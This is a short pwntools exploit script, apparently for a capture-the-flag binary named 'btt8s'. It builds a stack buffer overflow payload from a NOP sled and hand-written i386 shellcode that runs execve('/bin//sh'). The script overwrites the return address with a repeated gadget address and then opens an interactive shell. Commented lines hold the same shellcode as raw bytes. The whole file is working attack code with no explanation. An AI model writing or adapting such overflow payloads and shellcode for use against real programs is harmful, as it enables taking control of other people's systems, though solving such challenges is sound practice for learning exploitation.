from pwn import *

io = process("./btt8s")
# io = gdb.debug("./btt8s", gdbscript='''
# b *0x8048460
# b *0x8048489
# c
# ''')
context.log_level = 'debug' 
context.arch = "i386"
payload = b'\x90'*(0x108-23)
payload += asm('''
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ecx, eax
xor edx, edx
mov al, 0xb
mov ebx, esp
int 0x80
''')
# payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
# payload += b'a'*(256-0x70-27+8)
# payload += b'a'*(0x70)
payload += p32(0x080482d6)
payload += p32(0x080482d6)
payload += p32(0x080482d6)
payload += p32(0x080482d6)
# payload += p32(0x0804836b)
# payload += b'\x00'
io.sendline(payload)
io.interactive()
